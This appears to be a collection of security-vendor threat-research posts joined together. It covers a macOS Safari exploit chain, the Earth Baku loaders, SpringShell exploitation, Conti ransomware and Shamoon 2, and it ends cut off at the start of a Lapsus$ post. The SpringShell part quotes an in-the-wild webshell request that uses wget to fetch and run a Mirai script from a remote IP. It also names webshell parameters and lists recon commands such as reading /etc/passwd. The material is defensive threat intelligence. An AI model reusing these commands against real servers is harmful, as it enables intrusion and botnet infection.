"Loading a page with the WebKit RCE on the latest version of Safari (14.1), we learned the RCE was an n-day since it did not successfully trigger the exploit."
"To verify this hypothesis, we ran git bisect and determined it was fixed in this commit."
Capstone.js
"It was interesting to see the use of Capstone.js, a port of the Capstone disassembly framework, in an exploit chain as Capstone is typically used for binary analysis."
The exploit authors primarily used it to search for the addresses of dlopen and dlsym in memory.
"Once the embedded Mach-O is loaded, the dlopen and dlsym addresses found using Capstone.js are used to patch the Mach-O loaded in memory."
"With the Capstone.js configured for X86-64 and not ARM, we can also derive the target hardware is Intel-based Macs."
Embedded Mach-O
"After the WebKit RCE succeeds, an embedded Mach-O binary is loaded into memory, patched, and run."
"Upon analysis, we realized this binary contained code which could escape the Safari sandbox, elevate privileges, and download a second stage from the C2."
Analyzing the Mach-O was reminiscent of a CTF reverse engineering challenge.
It had to be extracted and converted into binary from a Uint32Array.
Then the extracted binary was heavily obfuscated with a relatively tedious encoding mechanism--each string is XOR encoded with a different key.
Fully decoding the Mach-O was necessary to obtain all the strings representing the dynamically loaded functions used in the binary.
There were a lot of strings and decoding them manually would have taken a long time so we wrote a short Python script to make quick work of the obfuscation.
"The script parsed the Mach-O at each section where the strings were located, then decoded the strings with their respective XOR keys, and patched the binary with the resulting strings."
"Once we had all of the strings decoded, it was time to figure out what capabilities the binary had."
There was code to download a file from a C2 but we did not come across any URL strings in the Mach-O so we checked the javascript and saw there were two arguments passed when the binary is run–the url for the payload and its size
"After downloading the payload, it removes the quarantine attribute of the file to bypass Gatekeeper."
It then elevated privileges to install the payload.
day or 0-day?
"Before further analyzing how the exploit elevated privileges, we needed to figure out if we were dealing with an N-day or a 0-day vulnerability."
An N-day is a known vulnerability with a publicly available patch.
Threat actors have used N-days shortly after a patch is released to capitalize on the patching delay of their targets.
"In contrast, a 0-day is a vulnerability with no available patch which makes it harder to defend against."
"Despite the exploit being an executable instead of shellcode, it was not a standalone binary we could run in our virtual environment."
It needed the address of dlopen and dlsym patched after the binary was loaded into memory.
These two functions are used in conjunction to dynamically load a shared object into memory and retrieve the address of a symbol from it.
They are the equivalent of LoadLibrary and GetProcAddress in Windows.
"To run the exploit in our virtual environment, we decided to write a loader in Python which did the following: For our payload, we wrote a simple bash script which runs id and pipes the result to a file in /tmp."
The result of the id command would tell us whether our script was run as a regular user or as root.
"Having a loader and a payload ready, we set out to test the exploit on a fresh install of Catalina (10.15) since it was the version in which we were served the full exploit chain."
The exploit worked and ran our bash script as root.
We updated our operating system with the latest patch at the time (2021-004) and tried the exploit again.
It still worked.
We then decided to try it on Big Sur (11.4) where it crashed and gave us the following exception.
The exception indicates that Apple added generic protections in Big Sur which rendered this exploit useless.
"Since Apple still supports Catalina and pushes security updates for it, we decided to take a deeper look into this exploit."
Elevating Privileges to Root The Mach-O was calling a lot of undocumented functions as well as XPC calls to mach_msg with a MACH_SEND_SYNC_OVERRIDE flag.
This looked similar to an earlier in-the-wild iOS vulnerability analyzed by Ian Beer of Google Project Zero.
Beer was able to quickly recognize this exploit as a variant of an earlier port type confusion vulnerability he analyzed in the XNU kernel (CVE-2020-27932).
"Furthermore, it seems this exact exploit was presented by Pangu Lab in a public talk at zer0con21 in April 2021 and Mobile Security Conference (MOSEC) in July 2021."
"In exploiting this port type confusion vulnerability, the exploit authors were able to change the mach port type from IKOT_NAMED_ENTRY to a more privileged port type like IKOT_HOST_SECURITY allowing them to forge their own sec_token and audit_token, and IKOT_HOST_PRIV enabling them to spoof messages to kuncd. After gaining root, the downloaded payload is loaded and run in the background on the victim's machine via launchtl."
The payload seems to be a product of extensive software engineering.
It uses a publish-subscribe model via a Data Distribution Service (DDS) framework for communicating with the C2.
"It also has several components, some of which appear to be configured as modules."
"For example, the payload we obtained contained a kernel module for capturing keystrokes."
There are also other functionalities built-in to the components which were not directly accessed from the binaries included in the payload but may be used by additional stages which can be downloaded onto the victim's machine.
Notable features for this backdoor include: Our team is constantly working to secure our users and keep them safe from targeted attacks like this one.
We continue to collaborate with internal teams like Google Safe Browsing to block domains and IPs used for exploit delivery and industry partners like Apple to mitigate vulnerabilities.
We are appreciative of Apple’s quick response and patching of this critical vulnerability.
"For those interested in following our in-the-wild work, we will soon publish details surrounding another, unrelated campaign we discovered using two Chrome 0-days (CVE-2021-37973 and CVE-2021-37976)."
That campaign is not connected to the one described in today’s post.
Delivery URLs Javascript Sandbox escape / LPE Backdoor C2
"We have uncovered a cyberespionage campaign being perpetrated by Earth Baku, an advanced persistent threat (APT) group with a known history of carrying out cyberattacks under the alias APT41."
"This is not the group’s first foray into cyberespionage, and its long list of past cybercrimes also includes ransomware and cryptocurrency mining attacks."
"Earth Baku deploys its ongoing campaign, which can be traced to as far back as July 2020, through multiple attack vectors that are designed based on different exploits or the infrastructure of its targeted victim's environment: • SQL injection to upload a malicious file • Installment through InstallUtil.exe in a scheduled task • Possibly a malicious link (LNK) file sent as an email attachment • Exploitation of the ProxyLogon vulnerability CVE-2021-26855 to upload a China Chopper web shell This campaign uses previously unidentified shellcode loaders, which we have named StealthVector and StealthMutant, and a backdoor, which we have dubbed ScrambleCross."
Earth Baku has developed these new malware tools to facilitate targeted attacks on public and private entities alike in specific industries that are located in the Indo-Pacific region.
Figure 1.
Countries affected by Earth Baku’s new campaign Source: Trend Micro™ Smart Protection Network™ infrastructure StealthVector
"We initially observed StealthVector, a shellcode loader written in C/C++, in October 2020."
"StealthVector is designed with various configurable features that make it easy for malicious actors to modify and tailor it to their needs, including a feature that disables Event Tracing for Windows (ETW), allowing the malware to run in stealth mode."
"This loader can stealthily run its payload in various ways, such as using the CreateThread function, bypassing Microsoft’s Control Flow Guard (CFG), module stomping, and phantom dynamic link library (DLL) hollowing."
"StealthMutant Like StealthVector, StealthMutant, which supports both 32-bit and 64-bit operating systems, can disable ETW."
"This loader, written in C#, has been used by malicious actors since July 2020."
"Many of the StealthMutant samples we have analyzed use AES-256-ECB for decryption; alternatively, an earlier variant of the loader uses XOR."
"After its payload is decrypted, StealthMutant performs process hollowing to execute its payload in a remote process."
ScrambleCross
"Both StealthMutant and StealthVector contain a payload of either the Cobalt Strike beacon or ScrambleCross, a newly discovered backdoor."
ScrambleCross receives instructions from its command-and-control (C&C) server that allow it to receive and manipulate plug-ins.
"However, we have yet to retrieve and study one of these plug-ins."
"It has many of the same capabilities as another backdoor, Crosswalk, which has also been used by Earth Baku."
"For example, both calculate the hash of the code section as an anti-bugging technique, both are designed as fully position-independent code, and both support various kinds of network communication protocols."
"Connections to other campaigns Earth Baku’s recent activities are related to another campaign that has been active since at least November 2018, as reported by FireEye and Positive Technologies."
"While the older campaign uses a different shellcode loader, which we have named LavagokLdr, we have observed similar code and procedures between LavagokLdr and StealthVector."
"In the same vein, we have observed that LavagokLdr’s payload, Crosswalk, and one of StealthVector’s payloads, ScrambleCross, perform similar techniques for decryption and signature checking."
"But because Earth Baku has updated its toolset with StealthVector, StealthMutant, and ScrambleCross for this new campaign, we have identified it as its own separate operation."
Figure 2.
A timeline of Earth Baku’s previous campaign as APT41 and its new campaign How Earth Baku creates its malware tools Earth Baku is known for its use of self-developed tools.
"To continue doing so, it appears to be filling its ranks with malicious actors who are pooling their diverse skills."
"Interestingly, the new malware tools involved in Earth Baku’s new campaign indicates that the APT group has likely recruited members who specialize in low-level programming, software development, and red-team techniques."
"For more details about Earth Baku’s new campaign, read our research paper ""Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdoor."" Tags Articles, News, Reports | APT & Targeted Attacks | Research"
"This post is also available in: 日本語 (Japanese) Recently, two vulnerabilities were announced within the Spring Framework, an open-source framework for building enterprise Java applications."
"On March 29, 2022, the Spring Cloud Expression Resource Access Vulnerability tracked in CVE-2022-22963 was patched with the release of Spring Cloud Function 3.1.7 and 3.2.3."
"Two days later on March 31, 2022, Spring released version 5.3.18 and 5.2.20 of Spring Framework to patch another more severe vulnerability tracked in CVE-2022-22965."
"The CVE-2022-22965 vulnerability allows an attacker unauthenticated remote code execution (RCE), which Unit 42 has observed being exploited in the wild."
The exploitation of this vulnerability could result in a webshell being installed onto the compromised server that allows further command execution.
"Because the Spring Framework is widely used for web system development and the severity of the vulnerability is critical (CVSS score of 9.8), CVE-2022-22965 is given the name SpringShell (and/or Spring4Shell) by the infosec community."
"To understand the impact of this vulnerability, we analyzed all the available information and located the issue in the source code."
"On April 8, we updated this blog to include statistics on SpringShell exploitation attempts that we identified by analyzing hits on the Spring Core Remote Code Execution Vulnerability threat prevention signature for the Palo Alto Networks Next-Generation Firewall, as well as alerts triggered in Cortex XDR."
We also added a section on indicators.
"Palo Alto Networks customers receive protections against CVE-2022-22965 and CVE-2022-22963 via products and services including Cortex XDR Prevent and Pro, a Threat Prevention subscription for the Next-Generation Firewall, and Prisma Cloud Compute."
Affected Software and Versions Background on the Spring Framework Root Cause Analysis for CVE-2022-22965
Background on Exploitation of the Class Loader Establishing a Reverse Shell Connection to a Remote Server on the Compromised Server SpringShell Exploit Observed in the Wild Conclusion
Additional Resources Indicators Existing proofs of concept (PoCs) for exploitation work under the following conditions: Any Java application using Spring Beans packet (spring-beans-*.jar) and using Spring parameters binding could be affected by this vulnerability.
The Spring Framework is an open-source application framework and inversion of the control container for the Java platform.
It is widely used in the industry by various programs and systems due to its powerful features and ease of use.
Some well-known products such as Spring Boot and Spring Cloud are developed with the Spring Framework.
The Spring Core (spring-core) is the core of the framework that provides powerful features such as inversion of control and dependency injection.
"It contains the core, beans, context and Spring Expression Language (SpEL) modules."
The vulnerability is caused by the getCachedIntrospectionResults method of the Spring framework wrongly exposing the class object when binding the parameters.
The default Spring data binding mechanism allows developers to bind HTTP request details to application-specific objects.
"For example, there is a simple classical application scenario in which the developer creates a trade object to capture request parameters as shown in Figure 1."
"Then the developer creates a controller to use the object trade as shown in Figure 2. After that, the developer usually creates a request builder for the trade controller, which allows the web user to access the trade object remotely as shown in Figure 3."
"When web users access trade object properties, the binding process (bindRequestParameters) in the Spring framework implementation will call the getCachedIntrospectionResults method to get and set the object property in the cache."
"However, the return object of the getCachedIntrospectionResults method includes a class object."
This means that web users can get a class object remotely by simply submitting a URL as shown in Figure 4.
Exposing the class object to web users is very dangerous and can lead to RCE in many ways.
The class loader is often used by exploiting payloads to load some sensitive classes dynamically for object modification and code execution.
One easy way to get RCE is using the exposed class loader to modify the Tomcat log configuration and remotely upload a JSP web shell after changing the Tomcat log configuration.
One example of changing the Tomcat log configuration by simply submitting a URL is shown in Figure 5.
This is the exploit method used in the public PoC for the SpringShell vulnerability.
"Early in 2010, CVE-2010-1622 was assigned to a remote code execution vulnerability in the Spring Framework."
This vulnerability was due to the lack of proper check on the provided PropertyDescriptor in CachedIntrospectionResults() so that class.classLoader is allowed to be utilized to modify the search path of the system's class loader and cause the program to invoke remote Java code.
"For this vulnerability, the class loader plays a vital role in the exploitation."
"In the Spring Framework version 2.5.6.SEC02, the vulnerability was fixed."
"However, while the original way of obtaining the class loader and exploiting it no longer works, a new feature of JDK was introduced in version 9, providing another way to obtain the class loader and making the exploit possible again."
The code snippet seen in Figure 6 shows the fix to CVE-2010-1622.
The fix is to use a block list to exclude two methods: Class.getClassLoader() and getProtectionDomain() as highlighted in Figure 6.
But using a block list runs the risk of being bypassed by the cases not on the list.
And the Java 9 Platform Module System (JPMS) provides a way to bypass this block list.
The newly added module property makes it possible to modify the logging configuration so that a JSP webshell can be written into the web host folder via the logging function as shown in Figure 7.
Figure 8 shows the payload drops a password-protected webshell in the Tomcat ROOT directory called shell7.jsp.
Attackers can then invoke any command through the JSP webshell.
Figure 9 shows the example of executing Netcat to establish a reverse shell to a remote server on the compromised server.
Exploit code for this remote code execution vulnerability has been made publicly available.
"Unit 42 first observed scanning traffic early on March 30, 2022 with HTTP requests to servers that included the test strings within the URL."
Figure 10 shows an example of the early scanning activity.
"While testing our Threat Prevention signatures, we observed additional scanning activity that included the exploit code within the data section of the HTTP POST request, as seen in Figure 11."
"Once we deployed the Threat Prevention signatures, we analyzed the packet captures associated with our ""Spring Core Remote Code Execution Vulnerability"" signature and found that a majority of the activity was likely generated by variations of the publicly available PoC tools."
Our analysis shows that the following filenames would store the webshell contents on the server in the event of successful exploitation: 0xd0m7.jsp myshell.jsp shell.jsp tomcatwar.jsp wpz.jsp The webshell contents written to these files are very similar to the code included in the publicly available PoC as well.
There are two variants of the webshell.
One was included in the PoC and uses the pwd parameter for authentication (password is always j) and the cmd parameter for the command to execute.
The second variant does not use a parameter for authentication and uses id for the command to execute.
Table 1 shows the parameters that the webshell saved to the server would use for authentication and command and how many times we saw them.
"Table 1. Parameters used by webshells seen in hits on ""Spring Core Remote Code Execution Vulnerability"" signature."
"We searched our telemetry for activity to webshells using the file names associated with the SpringShell activity, with the noted exception of shell.jsp, which is far too general."
We have seen the unique commands listed below submitted to webshells.
"Of these, only the two commands involving /etc/passwd would possibly suggest malicious intent for exploitation – the rest of the commands suggest general scanning activity."
ls nslookup%20[redacted].test6.ggdd[.]co[.]uk nslookup+[redacted].test6.ggdd[.]co[.]uk ping%20[redacted].test6.ggdd[.]co[.]uk ping+[redacted].test6.ggdd[.]co[.]uk whoami cat%20/etc/passwd cat+/etc/passwd id ifconfig ipconfig ping%20[redacted].burpcollaborator[.]net
Our Spring Core Remote Code Execution Vulnerability signature was released in the early hours of March 31.
"On April 7, we collected the seven days’ worth of activity since the signature release and found that the signature had triggered 43,092 times."
"Figure 12 shows the steady increase of total hits from March 31 until April 3, a fairly significant decrease on April 4, followed by an incline in activity on April 5 and 6."
"At this time, we have yet to confirm any successful exploitation attempts that led to a webshell installed onto the server outside of testing activity using purposefully vulnerable applications."
"We observed a large amount of unique IP addresses during our analysis – with 2,056 addresses triggering the Spring Core Remote Code Execution Vulnerability signature."
"Table 2 shows the top 15 IP addresses seen as the source that triggered our signature, which accounts for just over 50% of all of the activity we observed."
Table 2. Top 15 source IPs triggering the Spring Core Remote Code Execution Vulnerability signature.
"We were able to analyze 31,953 packet captures that triggered the Spring Core Remote Code Execution Vulnerability signature to determine the webshell filenames and the webshell contents that would be saved to the server in the event of successful exploitation."
"In many cases, the webshell file names had .jsp extensions, which would allow for a successful exploitation to install a working webshell."
"However, in many cases the filename had an extension that would not support a webshell, such as .js and .txt, which we believe was used just to mark the presence of a successful file upload as part of vulnerable server discovery efforts."
"At the time of writing, we have observed 95 unique webshell filenames, which we have included in the indicators section."
"A majority of the activity used the tomcarwar.jsp filename that was used in the initial PoC script, which accounted for over 57% of the filenames observed."
"In fact, the top three filenames – tomcarwar.jsp, checkexploit.jsp and javatestfila.jsp – account for over 84% of the activity with known webshell filenames."
The pie chart in Figure 13 shows a high-level breakdown of the most common filenames.
"A majority of the packets we analyzed showed the webshell contents did not differ far from the webshell seen in the original proof-of-concept script, which can be seen in Figure 14."
"Another very common webshell seen within our telemetry is the exact same with different HTTP parameters and values used by the webshell, as seen in Figure 15."
We also observed a significant amount of exploit attempts using content that again was a modification of the initial webshell in the proof-of-concept.
"Figure 16 shows the contents that we observed in the wild, which should not be considered a webshell as it does nothing more than display SPRING_CORE_RCE."
The lack of webshell functionality suggests that this is likely uploaded by scanners attempting to discover servers vulnerable to SpringShell.
"More recently, we have seen an uptick in webshell content as seen in Figure 17, which is related to another proof-of-concept script created by K3rwin."
This particular webshell will load a base64 encoded class that will contain the functionality desired by the actor.
"This particular webshell is based on AntSword’s shell.jsp, which was modified to use a parameter of k3rwin instead of ant to load the class."
The only malicious activity we have seen in our telemetry related to SpringShell involves HTTP requests to URLs containing the tomcatwar.jsp filename associated with the SpringShell proof-of-concept script.
The activity involved parameters issued to the webshell that would run a command to download and execute a script from a remote server as seen in the following: [redacted IPV4 address]:8080/tomcatwar.jsp?pwd=j&cmd=/bin/sh/-c${IFS}'cd${IFS}/tmp;wget${IFS}hxxp://107.174.133[.]167/t.sh${IFS}-O-%a6sh${IFS}SpringCore;'
"Upon further analysis, the t.sh script hosted on this remote server is related to the Mirai botnet."
"The requests above were sent from the IP address ​​194.31.98[.]186, which itself has hosted payloads associated with Mirai as well."
Inbound attempts to exploit the SpringShell vulnerability from 194.31.98[.]186 attempted to install the webshell from the original proof-of-concept seen in Figure 14.
Our signatures blocked the initial attempt to exploit the vulnerability so we cannot confirm if Mirai’s attempts to exploit SpringShell have been successful.
Both Netlab 360 and Trend Micro also observed Mirai activity related to the SpringShell vulnerability.
"In addition to our threat prevention signatures, we analyzed the alerts triggered in Cortex XDR and found 116 events between April 4 and April 8."
A majority of these alerts are triggered by testing of the proof-of-concept tools previously mentioned above.
"We also observed several alerts involving a docker container named spring4shell, which had a /helloworld directory and had a listening port tcp/8080."
"We believe these docker containers are also part of internal testing efforts using publicly available docker containers, such as Spring4Shell-POC."
"The signature triggered on the creation of the webshell files, of which we observed the following file written: /usr/local/tomcat/work/Catalina/localhost/ROOT/org/apache/jsp/shell_jsp.java /usr/local/tomcat/webapps/ROOT/shell_.jsp SpringShell is officially assigned CVE-2022-22965, and the patch was released on March 31, 2022."
"Since exploitation is straightforward and all the relevant technical details have already gone viral on the internet, it’s possible that SpringShell will become fully weaponized and abused on a larger scale."
Developers and users who have projects or products based on JDK9+ and the Spring Framework (or its derivatives) are strongly urged to patch as soon as possible.
"While CVE-2022-22963 is a different vulnerability in Spring Cloud Function (not technically part of SpringShell), a Threat Prevention signature is also available to ensure coverage at the perimeter."
Unit 42 researchers are proactively monitoring info related to other recently disclosed Spring vulnerabilities and will proceed to provide coverage as soon as more info has become available.
Unit 42 is actively monitoring malicious traffic through our devices and cloud solutions.
The Palo Alto Networks Product Security Assurance team is evaluating CVE-2022-22963 and CVE-2022-22965 as relates to Palo Alto Networks products and currently assigns this a severity of none.
Palo Alto Networks Next-Generation Firewall with a Threat Prevention subscription can block the attack traffic related to this vulnerability. Palo Alto Networks Prisma Cloud can detect the presence of both CVE-2022-22965 and CVE-2022-22963 across all Compute environments.
"Palo Alto Networks Cortex XDR Prevent and Pro customers running agent version 7.4 and above with content version 450-87751 on Linux devices are protected from CVE-2022-22963 using the Java Deserialization module; customers running agent version 7.7 and content 480 and above are protected from CVE-2022-22963 and CVE-2022-22965 for both Windows and Linux using the Java Deserialization module; other OSes and exploits receive protections from post-exploitation activities using Behavioral Threat Protection, Password Theft Prevention, Anti Ransomware and other Anti Exploitation modules."
Cortex XDR Pro customers also have visibility into post-exploitation activities and can specifically track the “Process execution with a suspicious command line indicative of the Spring4Shell exploit” and “Suspicious HTTP Request to a vulnerable Java class” Analytics BIOCs.
"Furthermore, customers can create a BIOC from an XQL query looking for the dropped webshell IoCs to detect exploitation attempts in their environments."
"Palo Alto Networks Cortex XSOAR customers can leverage the ""Spring Core and Cloud Function SpEL RCEs"" pack to automatically detect and mitigate the vulnerabilities."
Read more on the XSOAR marketplace.
"Prisma Cloud Mitigations for SpringShell and Recent Spring Vulnerabilities: CVE-2022-22963, CVE-2022-22965 How Cortex XDR Blocks SpringShell Exploits 0808a56a90ca2f8b1e91a1e60b7b451e.txt 0c901fefcae46ba984225aa72df0825c.txt 1532b681733b6bce2ff7252d8890d550.txt 28fcea06661f13ebe9c87327f949f3a8.txt 2b98432e352ff74569b81099dd5ee246.txt 4acbedbe977480d19b7b682d4878cae2.txt 4fdd6fbd220e26b63a7c9a5aa88f5f31.txt 5657e4634210a3d47a789d1389a89320.txt 646bbc2c112070c26b3c042e81c6947e.txt 70b98d30e383df910ce3d693603404fb.txt 73be7d1ef52c3dbc9a5d726288d8a4ba.txt 83d81ef47f0e9a205fb66a100f3179bf.txt 8592f3e430720d324d7cfd7ecd1de521.txt 8697f146477832389449cf2548032ca7.txt Shell.jsp UJaez.jsp Y4kws.jsp a6bfc76094f689dab978f059ea2456a1.txt aniwvzgvwqnwtehgsfsgbslwoiqkjk.jsp appli12 baf24e5f9fc18cf58172d1ba745f0f7a.txt c41fc8f359d1658559c2d1c0043c76fb.txt cbsewlaeqsdsqktavziakyzsuwfciu.jsp czbwzitpzjzkcvkrirybzihsibmuej.jsp czpdnhpraxgzrtatiuigsalfedwwit.jsp dnuurzjtlbjrnuukwdmaltqrqqlaig.jsp duvdqpoyrcapqbfcetgwsqxfkslubw.jsp ee947d98b91c8ada08f8c15e8f3248fc.txt efdde87c66fe4e6dc73a2ab6111ca58a.txt facb4be5385617bf11e6d67f0aa0203b.txt ggoibjvztvlpelaghjzeweqmopjosz.jsp goocmasqxwfufyxrgyachwidxdotkh.jsp hlbpgpqsyracfnvkgrgvlhcptpmdfn.jsp hmmyitbecwhmrdicykmfvqlcsknbff.jsp hnmqeuzumlokxuhqyekeetrgougeof.jsp ilvckpgzbrcdljyqdfhqendqcwhgxp.jsp izodfyvqujwztweclykgozahdlqvqp.jsp jynrrkjghebemkrhvfzllrepzosinb.jsp kqbnngrfnsxlreajyknuimoamysvwt.jsp ltcovlwqkckjpuzbqzbjdpkgkakvno.jsp mhoqqvpuxdqtuqzmwdrvdeayqvlygb.jsp osanxuadyvjaiorcjfqnckfpewunnt.jsp ptipfhjosfvrfwndwqccapozcbasge.jsp pxwcqxzrstepmbwufjxuaydkwgmvds.jsp qnzfvqpeiljtoyvrywrkuvkrmuewzn.jsp rQFlA.jsp rmdwahilztwhhqnmcbodkgtbnmrhjx.jsp tomcat74935.jsp ubekdurthzexowlohzgienbwvexynd.jsp ufoubgkazumxhqvwlnyfejnmyqofcm.jsp ujpmauuhltvsokjracgwkbflkhhnwo.jsp vkmckfvljtpbyowxwhgbjsvyktfdiq.jsp xcoihpiouaamtnbqqvcvffyxyrokvn.jsp yjjhhdlxepozhirznemjabnsciycvv.jsp yutugdqbrossntwaujgxwgrpgczkbd.jsp zawpiupzzsjexllfbicrgvlcuxzqyb.jsp zqgwtzyrexctiyvsawmwttncwzoyyd.jsp zuvuegtemzfsyqjfykowggxpqkuqdp.jsp 0xd0m7.jsp crashed_log_"
gdGCT.jsp
myshell.jsp
rakesh.jsp
shei1.jsp
shell13.jsp
tomcatlogin.jsp
data_theorem_spring4shell_scan.txt
jarom_h1.jsp
"jquery123123123cssbackup7331.jsp tomjj.jsp test1.jsp hackerone0x.jsp inject.jsp poc4bugb.jsp curiositysec.jsp mynameis0bsecure.jsp tomcatwa.jsp ahmed.txt testqqsg.jsp wpz.jsp lelel.jsp shell.jsp 07935fdf05b66.jsp vulntest-12345.txt jquerycssv2.js poc.jsp tomcatspring.jsp ofc.jsp lalalalal.jsp safetytest.txt log.txt safetytest javatestfila.jsp checkexploit.jsp tomcatwar.jsp Updated April 19, 2022, at 7:30 a.m. PT. Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address! Please mark, I'm not a robot! By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
This post is also available in: 日本語 (Japanese) Conti ransomware stands out as one of the most ruthless of the dozens of ransomware gangs that we follow.
"The group has spent more than a year attacking organizations where IT outages can have life-threatening consequences: hospitals, 911 dispatch carriers, emergency medical services and law enforcement agencies."
"Ireland has yet to recover from an attack in mid-May that prompted the shutdown of the entire information technology network of the nation's healthcare system – prompting cancellation of appointments, the shutdown of X-ray systems and delays in COVID testing."
Conti also stands out as unreliable.
"We've seen the group stiff victims who pay ransoms, expecting to be able to recover their data."
"The FBI has connected Conti to more than 400 cyberattacks against organizations worldwide, three-quarters of which are based in the U.S., with demands as high as $25 million."
This makes Conti one of the greediest groups out there.
"If you think you may have been impacted, please email unit42-investigations@paloaltonetworks.com or call (866) 4-UNIT42 to get in touch with the Unit 42 Incident Response team."
We’ve followed Conti for more than a year through our work helping organizations respond to ransomware attacks.
It appears to be one of many private cybercrime groups that have set up their operations by leveraging the booming ransomware-as-a-service (RaaS) ecosystem.
"Such gangs obtain their foothold in the networks of their victims by purchasing access from other threat actors, who sell it as a commodity."
"They can also procure infrastructure, malware, communications tools and money laundering from other RaaS providers."
"Most of these actors use the same methods of access found in many ransomware attacks, such as phishing emails and exploiting unprotected internet-facing applications, the lack of multi-factor authentication (MFA), as well as the typical avenues used to preserve and enhance access once it’s achieved, such as through the use of Cobalt Strike or PowerShell."
"These approaches are not particularly clever or sophisticated, but often they are effective."
Conti’s methodology often follows the “double extortion” approach that many leading ransomware groups are presently using.
"When using double extortion, attackers will not only lock up a victim’s files and demand ransom, but they will also steal files and threaten to publish them on a website or otherwise leak them if their initial ransom demand is not met. But Conti’s methods do have atypical elements."
"Usually, the more successful ransomware operators put a lot of effort into establishing and maintaining some semblance of “integrity” as a way of facilitating ransom payments from victims."
"They want to establish stellar reputations for “customer service” and for delivering on what they promise – that if you pay a ransom, your files will be decrypted (and they will not appear on a leak website)."
"Yet in our experience helping clients remediate attacks, Conti has not demonstrated any signs that it cares about its reputation with would-be victims."
"In one recent case, Conti did not return a client’s files who had paid the ransom."
This client got only a small fraction of the file restorations that were promised before the Conti ransomware representatives disappeared back into the dark web.
"In another case, our client needed an inventory of all files accessed, so that they could notify parties whose data was affected."
"Conti agreed to share that information if a payment was made, then changed their minds, saying, “We do not own that data anymore."
It was deleted and there is no chance to restore it.”
"Like many ransomware gangs, Conti is constantly adapting to changes, including recent heightened scrutiny by law enforcement and policy makers following high-profile disruptive attacks on the Colonial pipeline and healthcare organizations."
"When Ireland's healthcare system refused to pay any ransom, Conti provided the agency with what it said was a free decryption key."
"But there was a twist: The group maintained that it would still make good on its ""double extortion"" threat to publish stolen data on its leak site."
"Unfortunately, keeping Conti out of your network often isn’t simple."
"A primary means of infection appears to be through phishing scams, and attackers are constantly upping their game in this area."
"While phishing emails used to be pretty easy for almost anyone to spot, particularly after some awareness training, we are seeing increasingly sophisticated attacks in which the threat actors have done plenty of homework on their intended victims."
"Sometimes they’ll send a blitz of scam emails to employees throughout an organization, and it takes only one to open the attachment and release the malware into the network. Ransomware attacks are getting easier to unleash, and the rewards to the attackers are still growing by leaps and bounds."
"Accordingly, it continues to be a growth industry that will attract multitudes of new practitioners, and it is likely that high-profile targets will continue to fall."
"Palo Alto Networks detects and prevents Conti ransomware in the following ways: Additionally, Indicators of Compromise (IoCs) associated with Conti are available on GitHub, and have been published to the Unit 42 TAXII feed."
"Exploit Public-Facing Application [T1190], Spearphishing Attachment [T1566.001] Windows Command Shell [T1059.003], Native API [T1106] Deobfuscate/Decode Files or Information [T1140], Obfuscated Files or Information [T1027], Dynamic-link Library Injection [T1055.001] File and Directory Discovery [T1083], Network Share Discovery [T1135], Process Discovery [T1057], System Network Configuration Discovery [T1016], System Network Connections Discovery [T1049] SMB/Windows Admin Shares [T1021.002], Taint Shared Content [T1080] Data Encrypted for Impact [T1486], Inhibit System Recovery [T1490], Service Stop [T1489] Table 1."
Courses of Action for Conti ransomware.
†These capabilities are part of the NGFW security subscriptions service.
* These analytic detectors will trigger automatically for Cortex XDR Pro customers.
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
Unit 42 researchers have been following the Shamoon 2 attacks closely since November 2016.
"To date, Shamoon 2 has unfolded in three separate attack waves on November 11, 2016, November 29, 2016, and January 23, 2017."
"Based on our newest research, we can answer a question that many have had about these attacks: how is Shamoon 2 able to enter an organization’s network and spread so widely?"
The answer is simple: credential theft.
Credential theft has been known to be a key part of the Shamoon 2 attacks.
What our research is showing that’s new is how the attackers use the credentials once they’ve breached the network.
"And from this we can see how credential theft is the keystone of Shamoon 2 attacks; if an organization can prevent credential theft, the Shamoon 2 attacks can’t succeed."
"In our research, we’re able to outline that Shamoon 2 enters and spreads through an organization in three stages: These stages are outlined in the image below. And that credential theft is a key element in each stage: It’s also worth noting that credentials are a keystone issue in Shamoon 2 wave 2 too: we saw evidence of targeting an organization’s virtual desktop infrastructure (VDI) solutions with default credentials."
"While not stolen credentials, the effect is the same: attackers can use those credentials to abuse otherwise legitimate access and privileges to carry out their attacks."
"At this time, we do not have research that explains definitively how the Shamoon 2 attackers have obtained these credentials."
"We do believe there is evidence suggestive of a connection between Shamoon 2 and the Magic Hound campaign, which could indicate these two attack campaigns could have worked in conjunction with each other to execute the Shamoon 2 attacks."
"We also believe the presence of specific, valid named hosts from the network used in Stage 2 shows they were obtained directly from Active Directory on a domain controller."
"This is also suggestive of access to the network through legitimate, stolen credentials."
"In one sample we examined, we found a total of 844 hostnames."
"This also helps to set context for how widely Disttrack can attempt to spread: 844 systems, each attempting to spread to 256, means that from one distribution server, Shamoon 2 attackers could potentially try to spread Disttrack to 216,064 systems; and that’s not counting if any of those infected systems, in turn, attempts to spread to an additional 256 systems."
Shamoon 2 attacks are very targeted to a specific region.
But it would be a mistake to write-off the threat that Shamoon 2 demonstrates.
"Shamoon 2 attackers are using a rudimentary, but effective, distribution system of their own making."
The power of their attack doesn’t lie in the tools they use but in their ability to obtain and abuse legitimate credentials.
This underscores why credential theft is something that organizations should prioritize as a top threat and take steps to understand it and prevent it.
We’ve recently published a new Unit 42 white paper on credential theft that we encourage you to read.
"To help customers take steps to better understand and protect against this threat, we’ve posted information in our article PAN-OS Configuration Recommendations to Protect Against Shamoon 2 located in our Threat and Vulnerability Articles section on our Live Community."
You can also join in the discussion in our “About Threat and Vulnerability Discussions” on the Live Community.
"Ignite ’17 Security Conference: Vancouver, BC June 12–15, 2017 Ignite ’17 Security Conference is a live, four-day conference designed for today’s security professionals."
"Hear from innovators and experts, gain real-world skills through hands-on sessions and interactive workshops, and find out how breach prevention is changing the security industry."
"Visit the Ignite website for more information on tracks, workshops and marquee sessions."
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
This post is also available in: 日本語 (Japanese) The Lapsus$ Group threat actor has grown in just a few months from launching a handful of destructive attacks to stealing and publishing source code of multiple top-tier technology companies.
